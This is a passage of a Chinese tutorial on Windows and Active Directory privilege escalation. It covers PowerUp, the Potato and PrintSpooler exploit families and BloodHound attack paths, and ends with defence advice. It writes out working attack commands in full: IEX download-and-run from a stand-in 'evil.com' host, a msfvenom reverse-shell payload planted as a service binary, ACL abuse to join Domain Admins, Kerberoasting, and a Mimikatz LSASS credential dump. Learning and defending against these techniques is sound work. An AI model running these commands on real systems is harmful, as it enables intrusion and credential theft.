<li><p><strong>在 Windows机器上本地升级权限有多种方法（漏洞）</strong></p>
<ul>
<li>缺少补丁</li>
<li>明文形式的自动部署和自动登录密码</li>
<li>AlwaysInstallElevated(任何用户都可以以SYSTEM身份运行MSI )服务配置错误</li>
<li>DLL劫持等</li>
</ul>
</li>
<li><p><strong>在环境下无法利用漏洞进行提权时</strong></p>
<ul>
<li>积极利用不安全的配置</li>
<li>不安全的配置很少有针对它们的补丁，而且他们不是安全团队的重点</li>
<li>针对企业应用程序部署时并未考虑到安全性，例如测试系统权限过大、测试账号权限过大</li>
<li>在Windows上许多企业应用程序需要管理特权或系统特权才能够运行，可以尝试白加黑（白exe+黑+dll）</li>
</ul>
</li>
</ul>
<hr>
<h2 id="3-自动化提权工具"><a href="#3-自动化提权工具" class="headerlink" title="3. 自动化提权工具"></a><strong>3. 自动化提权工具</strong></h2><h3 id="1-PowerUp-ps1"><a href="#1-PowerUp-ps1" class="headerlink" title="(1) PowerUp.ps1"></a><strong>(1) PowerUp.ps1</strong></h3><ul>
<li><strong>功能</strong>：自动化检测服务、计划任务、注册表等提权路径。</li>
<li><strong>使用</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://evil.com/PowerUp.ps1&#x27;</span>)</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span>  <span class="comment"># 检测所有潜在漏洞</span></span><br><span class="line"><span class="built_in">Invoke-ServiceAbuse</span> <span class="literal">-Name</span> VulnerableService  <span class="comment"># 利用可写服务提权</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-Windows-Exploit-Suggester"><a href="#2-Windows-Exploit-Suggester" class="headerlink" title="(2) Windows-Exploit-Suggester"></a><strong>(2) Windows-Exploit-Suggester</strong></h3><ul>
<li><strong>原理</strong>：根据 <code>systeminfo</code> 输出匹配已知漏洞。</li>
<li><strong>使用</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./windows-exploit-suggester.py --database 2023-10.xls --systeminfo systeminfo.txt</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="3-Metasploit"><a href="#3-Metasploit" class="headerlink" title="(3) Metasploit"></a><strong>(3) Metasploit</strong></h3><ul>
<li><strong>常用模块</strong>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use post/multi/recon/local_exploit_suggester  <span class="comment"># 本地漏洞检测</span></span><br><span class="line">use exploit/windows/local/service_permissions  <span class="comment"># 服务权限滥用</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>以下是关于 <strong>Windows提权土豆家族（Potato Family）</strong> 的详细介绍，涵盖其原理、常见工具、利用条件及防御建议：</p>
<hr>
<h3 id="4-土豆家族"><a href="#4-土豆家族" class="headerlink" title="(4) 土豆家族"></a><strong>(4) 土豆家族</strong></h3><h4 id="1-土豆家族概述"><a href="#1-土豆家族概述" class="headerlink" title="1. 土豆家族概述"></a><strong>1. 土豆家族概述</strong></h4><p><strong>土豆家族</strong> 是一系列利用 Windows 特权或漏洞进行本地权限提升（Local Privilege Escalation, LPE）的工具和技术统称。它们通过模拟高权限令牌（如 <code>SYSTEM</code>）或滥用服务配置，将低权限用户（如 IIS、MSSQL 服务账户）提升至系统权限，广泛用于红队渗透测试中。</p>
<h5 id="核心原理"><a href="#核心原理" class="headerlink" title="核心原理"></a><strong>核心原理</strong></h5><ul>
<li><strong>特权滥用</strong>：利用 <code>SeImpersonatePrivilege</code>（模拟令牌）或 <code>SeAssignPrimaryTokenPrivilege</code>（分配令牌）特权，通过 API（如 <code>CreateProcessWithTokenW</code>）生成高权限进程。</li>
<li><strong>令牌窃取</strong>：通过中间人攻击（如 NTLM 重放）、命名管道（Named Pipe）或 RPC 接口，劫持系统进程（如 <code>spoolsv.exe</code>）的令牌。</li>
</ul>
<h5 id="⼟⾖系列漏洞与提权⼯具"><a href="#⼟⾖系列漏洞与提权⼯具" class="headerlink" title="⼟⾖系列漏洞与提权⼯具"></a>⼟⾖系列漏洞与提权⼯具</h5><p><strong>1. Rotten Potato</strong></p>
<p>滥⽤的权限：SeImpersonatePrivilege</p>
<p>描述：Rotten Potato 利⽤了 Windows 中的 NTLM relay 攻击，通过滥⽤具有<br>SeImpersonatePrivilege 权限的进程来获得 SYSTEM 权限。攻击者通过代理身份验证请求，<br>将⾃身提升为⽐当前进程更⾼的权限（通常为 SYSTEM）。</p>
<p><strong>2. Juicy Potato</strong></p>
<p>滥⽤的权限：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege</p>
<p>描述：Juicy Potato 是对 Rotten Potato 技术的改进，主要在更⾼版本的 Windows 上⼯作（例如<br>Windows 10 和 Server 2016）。它通过调⽤ DCOM （Distributed COM）服务来滥⽤<br>SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege ，同样可以将当前⽤户提升为<br>SYSTEM。</p>
<p><strong>3. Rogue Potato</strong></p>
<p>滥⽤的权限：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege</p>
<p>描述：Rogue Potato 是对 Juicy Potato 的进⼀步改进，修复了 Juicy Potato 在 Windows 10<br>（1903+）和 Windows Server 2019 上的不可⽤问题。它通过建⽴⽆凭证的 HTTP 连接来获取更<br>⾼权限的身份，继续利⽤ SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege。</p>
<p><strong>4. Sweet Potato</strong></p>
<p>滥⽤的权限：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege</p>
<p>描述：Sweet Potato 是对 Juicy Potato 的进⼀步改进，专⻔针对 Windows Server 2016 和<br>Windows Server 2019 的 LPE（Local Privilege Escalation）。它尝试通过各种 COM 对象进⾏提<br>权，当某些端点被 Windows 安全策略或补丁修复时，它会⾃动尝试其他路径。</p>
<p><strong>5. Potato.exe</strong></p>
<p>滥⽤的权限：SeImpersonatePrivilege</p>
<p>描述：Potato.exe 是 Rotten Potato 的昀早版本，⽤于本地提权。后来逐渐演化为更复杂的攻击<br>技术，如 Juicy Potato。Potato.exe 直接利⽤了 Windows 中的 NTLM relay 攻击，并利⽤ Web<br>请求来欺骗服务进⾏提权。</p>
<p><strong>6. Small Potato</strong></p>
<p>滥⽤的权限：SeImpersonatePrivilege<br>54<br>Print系列漏洞与提权⼯具</p>
<p>描述：Small Potato 是⼀种轻量级的⼟⾖提权⼯具，旨在通过昀少的操作来实现 SYSTEM 权限，<br>核⼼思想仍然是滥⽤ SeImpersonatePrivilege 。它的实现⽅式⽐其他⼟⾖⼯具要简单，针对特<br>定的场景做了优化。</p>
<p><strong>7. Ghost Potato</strong></p>
<p>滥⽤的权限：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege</p>
<p>描述：Ghost Potato 是⼟⾖系列的另⼀个变种，主要⽤于更⾼级的环境提权，特别是在⼀些不适<br>合使⽤ Juicy Potato 或 Rogue Potato 的环境下使⽤</p>
<h4 id="2-常见工具及利用场景"><a href="#2-常见工具及利用场景" class="headerlink" title="2. 常见工具及利用场景"></a><strong>2. 常见工具及利用场景</strong></h4><h5 id="1-主流土豆工具"><a href="#1-主流土豆工具" class="headerlink" title="(1) 主流土豆工具"></a><strong>(1) 主流土豆工具</strong></h5><table>
<thead>
<tr>
<th>工具名称</th>
<th>特点</th>
<th>适用系统版本</th>
</tr>
</thead>
<tbody><tr>
<td><strong>PrintSpoofer</strong></td>
<td>利用 <code>spoolsv.exe</code> 服务，通过命名管道模拟令牌</td>
<td>Win 8.1+&#x2F;Server 2012+</td>
</tr>
<tr>
<td><strong>RottenPotato</strong></td>
<td>通过 NTLM 重放攻击模拟 <code>SYSTEM</code> 令牌（MS16-075）</td>
<td>Win 7&#x2F;Server 2008 R2</td>
</tr>
<tr>
<td><strong>JuicyPotato</strong></td>
<td>早期经典工具，依赖 COM 组件滥用（需 CLSID 列表）</td>
<td>Win 7&#x2F;Server 2008 R2</td>
</tr>
<tr>
<td><strong>GodPotato</strong></td>
<td>通杀全系 Windows 的改进版，支持多种协议（HTTP、SMB 等）</td>
<td>Win 10&#x2F;Server 2016+</td>
</tr>
<tr>
<td><strong>SweetPotato</strong></td>
<td>支持多协议令牌模拟，适用于高版本系统</td>
<td>Win 10&#x2F;Server 2019+</td>
</tr>
<tr>
<td><strong>EfsPotato</strong></td>
<td>利用 EFS（加密文件系统）RPC 接口获取令牌</td>
<td>Win 10&#x2F;Server 2016+</td>
</tr>
<tr>
<td><strong>PrintNotifyPotato</strong></td>
<td>通过打印通知功能触发权限提升</td>
<td>Win 10&#x2F;Server 2019+</td>
</tr>
</tbody></table>
<p><strong>注</strong>：部分工具需自行编译（如 BadPotato、CandyPotato），部分自带 EXE（如 GodPotato、JuicyPotatoNG）。</p>
<h5 id="2-利用条件"><a href="#2-利用条件" class="headerlink" title="(2) 利用条件"></a><strong>(2) 利用条件</strong></h5><ul>
<li><strong>必要特权</strong>：当前用户需具备 <code>SeImpersonatePrivilege</code> 或 <code>SeAssignPrimaryTokenPrivilege</code>（常见于 IIS、MSSQL 服务账户）。</li>
<li><strong>服务依赖</strong>：如 PrintSpoofer 需 <code>spoolsv.exe</code> 运行，RottenPotato 依赖 NTLM 认证机制。</li>
<li><strong>系统补丁</strong>：未安装相关漏洞补丁（如 MS16-075、CVE-2021-1675）。</li>
</ul>
<h4 id="3-典型攻击流程"><a href="#3-典型攻击流程" class="headerlink" title="3. 典型攻击流程"></a><strong>3. 典型攻击流程</strong></h4><ol>
<li><strong>信息收集</strong>：<br>检查当前权限、系统版本及补丁状态：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>工具上传</strong>：<br>通过 Webshell 上传土豆家族 EXE（如 <code>GodPotato.exe</code>）至可写目录。</li>
<li><strong>执行提权</strong>：<br>运行工具生成高权限进程（如启动反向 Shell）：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GodPotato.exe -<span class="built_in">cmd</span> &quot;C:\shell.exe&quot;</span><br></pre></td></tr></table></figure></li>
<li><strong>权限维持</strong>：<br>通过 Cobalt Strike 或 Meterpreter 获取 <code>SYSTEM</code> 会话，进行横向移动或持久化。</li>
</ol>
<hr>
<h3 id="5-Print系列漏洞与提权⼯具"><a href="#5-Print系列漏洞与提权⼯具" class="headerlink" title="(5) Print系列漏洞与提权⼯具"></a><strong>(5) Print系列漏洞与提权⼯具</strong></h3><p><strong>1. PrintNightmare</strong></p>
<p>滥⽤的权限：SeLoadDriverPrivilege（特定情况下），或者远程执⾏⽆需特殊权限</p>
<p>描述：PrintNightmare 是⼀种漏洞，编号为 CVE-2021-34527，它影响了 Windows 的 Print<br>Spooler 服务，允许攻击者远程执⾏代码或者提升本地权限。虽然有些场景下需要<br>SeLoadDriverPrivilege 来加载恶意驱动，但更多时候是⽆权限限制的远程代码执⾏漏洞。<br><strong>2. PrintSpoofer</strong></p>
<p>滥⽤的权限：SeImpersonatePrivilege</p>
<p>描述：PrintSpoofer 利⽤了 Print Spooler 服务中的漏洞，同样滥⽤<br>SeImpersonatePrivilege 。该⼯具通过 Impersonation 提权，攻击者可以从低权限提升到<br>SYSTEM。<br><strong>3. PrintDemon</strong></p>
<p>滥⽤的权限：本地权限提升</p>
<p>描述：PrintDemon（CVE-2020-1048）是⼀个 Windows 打印服务中的本地提权漏洞。它允许攻<br>击者将恶意⽂件写⼊系统⽬录，从⽽实现代码执⾏或提权。此漏洞影响 Windows Print Spooler，<br>攻击者可以通过操控打印队列中的临时⽂件来执⾏恶意操作。<br><strong>4. CVE-2021-1675</strong></p>
<p>滥⽤的权限：本地权限提升、远程代码执⾏</p>
<p>描述：这是 PrintNightmare 漏洞的另⼀个变体，昀初被误认为仅是本地提权漏洞，但后来发现它<br>也具有远程代码执⾏的能⼒，攻击者可以通过 Print Spooler 服务在没有特别权限的情况下执<br>⾏任意代码。<br><strong>5. MS-RPRN (Remote Print Protocol Exploit)</strong></p>
<p>滥⽤的权限：远程代码执⾏</p>
<p>描述：MS-RPRN 是 Windows 中的远程打印协议（Remote Printing Protocol），其实现中多次出<br>现漏洞，允许攻击者通过⽹络发送恶意的打印请求来执⾏任意代码。该协议漏洞多次被利⽤，⽤<br>于横向移动或远程代码执⾏。</p>
<hr>
<h2 id="4-防御建议"><a href="#4-防御建议" class="headerlink" title="4. 防御建议"></a><strong>4. 防御建议</strong></h2><ol>
<li><strong>及时打补丁</strong>：修复已知漏洞（如永恒之蓝、PrintNightmare）。</li>
<li><strong>最小权限原则</strong>：<ul>
<li>服务账户使用低权限（如 <code>LOCAL SERVICE</code>）。</li>
<li>限制敏感目录（如 <code>C:\Windows\System32</code>）的写入权限。</li>
</ul>
</li>
<li><strong>启用UAC</strong>：防止自动提升权限。</li>
<li><strong>审计配置</strong>：<ul>
<li>检查计划任务、服务路径、注册表键。</li>
<li>使用 <strong>Sysinternals Suite</strong>（如 <code>AccessChk</code>、<code>AutoRuns</code>）。</li>
</ul>
</li>
<li><strong>监控日志</strong>：<ul>
<li>事件ID 4688（新进程创建）、4697（服务安装）、4104（PowerShell脚本执行）。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="5-示例：利用PowerUp提权"><a href="#5-示例：利用PowerUp提权" class="headerlink" title="5. 示例：利用PowerUp提权"></a><strong>5. 示例：利用PowerUp提权</strong></h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载并执行PowerUp</span></span><br><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://evil.com/PowerUp.ps1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检测漏洞</span></span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发现可写服务路径，生成Payload并替换</span></span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;检测到服务路径可写！&quot;</span></span><br><span class="line"><span class="variable">$serviceName</span> = <span class="string">&quot;VulnerableService&quot;</span></span><br><span class="line"><span class="variable">$payloadPath</span> = <span class="string">&quot;C:\Windows\Temp\evil.exe&quot;</span></span><br><span class="line">msfvenom <span class="literal">-p</span> windows/x64/shell_reverse_tcp LHOST=<span class="number">10.0</span>.<span class="number">0.1</span> LPORT=<span class="number">443</span> <span class="operator">-f</span> exe <span class="literal">-o</span> <span class="variable">$payloadPath</span></span><br><span class="line"><span class="built_in">sc</span> stop <span class="variable">$serviceName</span></span><br><span class="line"><span class="built_in">Copy-Item</span> <span class="variable">$payloadPath</span> <span class="literal">-Destination</span> <span class="string">&quot;C:\Program Files\Service\service.exe&quot;</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">sc</span> <span class="built_in">start</span> <span class="variable">$serviceName</span></span><br></pre></td></tr></table></figure>

<h1 id="五-域权限提升之Bloodhound"><a href="#五-域权限提升之Bloodhound" class="headerlink" title="五.域权限提升之Bloodhound"></a>五.域权限提升之Bloodhound</h1><hr>
<p>在 Active Directory（AD）域环境中，<strong>BloodHound</strong> 是一款强大的开源工具，用于可视化攻击路径并识别权限提升机会。它通过分析用户、组、ACL（访问控制列表）、GPO（组策略）等对象的关系，帮助红队快速定位提权路径。以下是结合 BloodHound 的域权限提升全流程指南：</p>
<hr>
<h3 id="1-BloodHound-核心概念"><a href="#1-BloodHound-核心概念" class="headerlink" title="1. BloodHound 核心概念"></a><strong>1. BloodHound 核心概念</strong></h3><h4 id="1-数据收集"><a href="#1-数据收集" class="headerlink" title="(1) 数据收集"></a><strong>(1) 数据收集</strong></h4><ul>
<li><strong>SharpHound</strong>：BloodHound 的官方数据收集器（C# 或 PowerShell 版本），用于抓取 AD 对象及其关系。</li>
<li><strong>收集类型</strong>：<ul>
<li><strong>默认收集</strong>：用户、组、计算机、ACL、会话、GPO、域信任等。</li>
<li><strong>高级收集</strong>：<code>-CollectionMethod All</code> 或指定特定类型（如 <code>LoggedOn</code>、<code>RDP</code>）。</li>
</ul>
</li>
</ul>
<h4 id="2-核心分析视角"><a href="#2-核心分析视角" class="headerlink" title="(2) 核心分析视角"></a><strong>(2) 核心分析视角</strong></h4><ul>
<li><strong>高价值目标</strong>：<ul>
<li><strong>特权组</strong>：Domain Admins、Enterprise Admins、Schema Admins。</li>
<li><strong>敏感用户</strong>：具备 <code>DCSync</code> 权限或 <code>AdminTo</code> 关系的用户。</li>
<li><strong>关键资源</strong>：域控制器、文件服务器、SQL 服务器。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-域权限提升实战流程"><a href="#2-域权限提升实战流程" class="headerlink" title="2. 域权限提升实战流程"></a><strong>2. 域权限提升实战流程</strong></h3><h3 id="步骤1：新版安装配置"><a href="#步骤1：新版安装配置" class="headerlink" title="步骤1：新版安装配置"></a>步骤1：新版安装配置</h3><ol>
<li><p>**<a target="_blank" rel="noopener" href="https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart#prerequisites">官网安装指导页面</a>**（需要先安装docker）</p>
</li>
<li><p>由于国内墙的原因导致安装指令需要开启系统代理翻墙。</p>
<p>且如果使用了sudo指令需要使用-E参数来继承环境变量。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=&quot;http://192.168.100.1:7890&quot;</span><br><span class="line">export https_proxy=&quot;http://192.168.100.1:7890&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>需要安装docker和docker-compose环境。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker.io docker-compose</span><br></pre></td></tr></table></figure>
</li>
<li><p>且docker需要配置配置镜像源。</p>
</li>
</ol>
<h4 id="步骤1：安装与配置"><a href="#步骤1：安装与配置" class="headerlink" title="步骤1：安装与配置"></a><strong>步骤1：安装与配置</strong></h4><ol>
<li><p><strong>安装 BloodHound</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Kali Linux</span></span><br><span class="line">sudo apt install bloodhound</span><br><span class="line"><span class="comment"># 或从 GitHub 下载最新版</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>启动 Neo4j 数据库</strong>（BloodHound 依赖）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j console</span><br></pre></td></tr></table></figure></li>
<li><p><strong>登录 BloodHound 界面</strong>：</p>
<ul>
<li>访问 <code>http://localhost:7474</code>，使用默认凭证 <code>neo4j/neo4j</code> 初始化密码。</li>
</ul>
</li>
</ol>
<h4 id="步骤2：数据收集"><a href="#步骤2：数据收集" class="headerlink" title="步骤2：数据收集"></a><strong>步骤2：数据收集</strong></h4><ol>
<li><strong>通过 SharpHound 收集数据</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载 SharpHound.ps1</span></span><br><span class="line"><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://&lt;攻击机&gt;/SharpHound.ps1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行数据收集（默认方法）</span></span><br><span class="line"><span class="built_in">Invoke-BloodHound</span> <span class="literal">-CollectionMethod</span> All <span class="literal">-Domain</span> &lt;域名&gt; <span class="literal">-ZipFileName</span> data.zip</span><br></pre></td></tr></table></figure>
<ul>
<li>生成 <code>data.zip</code> 文件后，将其导入 BloodHound 界面。</li>
</ul>
</li>
</ol>
<h4 id="步骤3：关键查询与攻击路径"><a href="#步骤3：关键查询与攻击路径" class="headerlink" title="步骤3：关键查询与攻击路径"></a><strong>步骤3：关键查询与攻击路径</strong></h4><p>在 BloodHound 中，使用 <strong>Cypher 查询</strong> 或预置分析功能定位提权路径：</p>
<h5 id="1-查找域管理员所在主机"><a href="#1-查找域管理员所在主机" class="headerlink" title="(1) 查找域管理员所在主机"></a><strong>(1) 查找域管理员所在主机</strong></h5><ul>
<li><strong>预置查询</strong>：<code>Find Domain Admins Logged On</code>。</li>
<li><strong>手动查询</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MATCH (u:User)-[:MemberOf]-&gt;(g:Group &#123;name: &quot;DOMAIN ADMINS@DOMAIN.COM&quot;&#125;)</span><br><span class="line">MATCH (c:Computer)-[:HasSession]-&gt;(u)</span><br><span class="line">RETURN u.name, c.name</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：定位域管理员登录的计算机，尝试横向移动或凭证窃取。</li>
</ul>
</li>
</ul>
<h5 id="2-ACL-滥用提权"><a href="#2-ACL-滥用提权" class="headerlink" title="(2) ACL 滥用提权"></a><strong>(2) ACL 滥用提权</strong></h5><ul>
<li><strong>场景</strong>：普通用户对高权限组（如 Domain Admins）有 <code>WriteDacl</code>、<code>GenericAll</code> 权限。</li>
<li><strong>查询</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MATCH (u:User &#123;name: &quot;USER@DOMAIN.COM&quot;&#125;)-[:GenericAll]-&gt;(g:Group &#123;name: &quot;DOMAIN ADMINS@DOMAIN.COM&quot;&#125;)</span><br><span class="line">RETURN u, g</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>利用方法</strong>：将自身添加到目标组：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> <span class="literal">-Members</span> <span class="string">&quot;普通用户&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h5 id="3-非特权用户到域控制器的攻击路径"><a href="#3-非特权用户到域控制器的攻击路径" class="headerlink" title="(3) 非特权用户到域控制器的攻击路径"></a><strong>(3) 非特权用户到域控制器的攻击路径</strong></h5><ul>
<li><strong>预置查询</strong>：<code>Shortest Paths to Domain Admins</code>。</li>
<li><strong>常见路径</strong>：<ul>
<li>用户 → 对计算机有本地管理员权限 → 计算机上有域管理员会话 → 抓取哈希。</li>
<li>用户 → 对 GPO 有编辑权限 → 修改 GPO 下发恶意任务。</li>
</ul>
</li>
</ul>
<h5 id="4-Kerberoasting-攻击目标"><a href="#4-Kerberoasting-攻击目标" class="headerlink" title="(4) Kerberoasting 攻击目标"></a><strong>(4) Kerberoasting 攻击目标</strong></h5><ul>
<li><strong>查询具备 SPN 的服务账号</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (u:User &#123;hasspn: true&#125;) RETURN u.name, u.serviceprincipalnames</span><br></pre></td></tr></table></figure>
<ul>
<li>导出票据后破解：<code>Invoke-Kerberoast -OutputFormat Hashcat | fl</code>.</li>
</ul>
</li>
</ul>
<h5 id="5-滥用-GPO-提权"><a href="#5-滥用-GPO-提权" class="headerlink" title="(5) 滥用 GPO 提权"></a><strong>(5) 滥用 GPO 提权</strong></h5><ul>
<li><strong>查询可编辑的 GPO</strong>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (u:User)-[:WriteDacl|Owns]-&gt;(g:GPO) RETURN u.name, g.name</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>利用方法</strong>：通过 GPO 下发计划任务或启动脚本，在域内主机执行恶意代码。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-实战提权案例"><a href="#3-实战提权案例" class="headerlink" title="3. 实战提权案例"></a><strong>3. 实战提权案例</strong></h3><h4 id="案例1：通过-ACL-提权到域管理员"><a href="#案例1：通过-ACL-提权到域管理员" class="headerlink" title="案例1：通过 ACL 提权到域管理员"></a><strong>案例1：通过 ACL 提权到域管理员</strong></h4><ol>
<li><strong>发现攻击路径</strong>：<br>BloodHound 显示用户 <code>Alice</code> 对 <code>HelpDesk</code> 组有 <code>GenericAll</code> 权限，而 <code>HelpDesk</code> 组对 <code>Domain Admins</code> 组有 <code>AddMember</code> 权限。</li>
<li><strong>执行提权</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 Alice 添加到 HelpDesk 组（如果尚未加入）</span></span><br><span class="line"><span class="built_in">Add-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;HelpDesk&quot;</span> <span class="literal">-Members</span> <span class="string">&quot;Alice&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 HelpDesk 组权限将 Alice 加入 Domain Admins</span></span><br><span class="line"><span class="built_in">Add-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> <span class="literal">-Members</span> <span class="string">&quot;Alice&quot;</span> <span class="literal">-Credential</span> (<span class="built_in">Get-Credential</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="案例2：利用会话劫持横向移动"><a href="#案例2：利用会话劫持横向移动" class="headerlink" title="案例2：利用会话劫持横向移动"></a><strong>案例2：利用会话劫持横向移动</strong></h4><ol>
<li><strong>定位高权限会话</strong>：<br>BloodHound 显示域管理员 <code>Admin</code> 登录到计算机 <code>PC-01</code>。</li>
<li><strong>获取 PC-01 控制权</strong>：<br>利用本地提权漏洞（如 Potato 家族）获取 <code>PC-01</code> 的 SYSTEM 权限。</li>
<li><strong>转储 LSASS 内存</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>使用域管理员凭证横向移动</strong>：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> DC<span class="literal">-01</span> <span class="literal">-ScriptBlock</span> &#123; whoami &#125; <span class="literal">-Credential</span> (<span class="built_in">Get-Credential</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="4-防御建议-1"><a href="#4-防御建议-1" class="headerlink" title="4. 防御建议"></a><strong>4. 防御建议</strong></h3><ol>
<li><strong>定期审计 ACL 和组权限</strong>：<ul>
<li>使用 BloodHound 的防御分析功能（如 <code>Active Directory ACL Cleanup</code>）。</li>
<li>移除普通用户对特权组的 <code>WriteDacl</code>、<code>GenericAll</code> 权限。</li>
</ul>
</li>
<li><strong>限制敏感组登录范围</strong>：<ul>
<li>禁止域管理员登录非域控制器主机。</li>
</ul>
</li>
<li><strong>启用 LAPS（本地管理员密码解决方案）</strong>：<ul>
<li>防止通过本地管理员权限横向移动。</li>
</ul>
</li>
<li><strong>监控异常行为</strong>：<ul>
<li>日志事件 ID 4624（登录）、4732（组添加成员）、5136（目录服务变更）。</li>
</ul>
</li>
<li><strong>限制 Kerberos 委派和 SPN</strong>：<ul>
<li>避免服务账号过度权限。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="5-扩展工具与技巧"><a href="#5-扩展工具与技巧" class="headerlink" title="5. 扩展工具与技巧"></a><strong>5. 扩展工具与技巧</strong></h3><ul>
<li><strong>PowerView</strong>：与 BloodHound 结合，手动验证攻击路径：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询用户对组的权限</span></span><br><span class="line"><span class="built_in">Get-ObjectAcl</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> | ? &#123; <span class="variable">$_</span>.ActiveDirectoryRights <span class="operator">-match</span> <span class="string">&quot;WriteProperty&quot;</span> &#125;</span><br></pre></td></tr></table></figure></li>
<li><strong>ADExplorer</strong>（Sysinternals）：实时浏览 AD 对象及权限。</li>
<li><strong>自动化攻击框架</strong>：<ul>
<li><strong>Impacket</strong>：执行 DCSync、Kerberoasting。</li>
<li><strong>CrackMapExec</strong>：自动化横向移动与权限验证。</li>
</ul>
</li>
</ul>
<hr>
<p>通过 BloodHound，红队可高效识别 AD 环境中的脆弱环节，而防御者则能借此加固权限架构。</p>
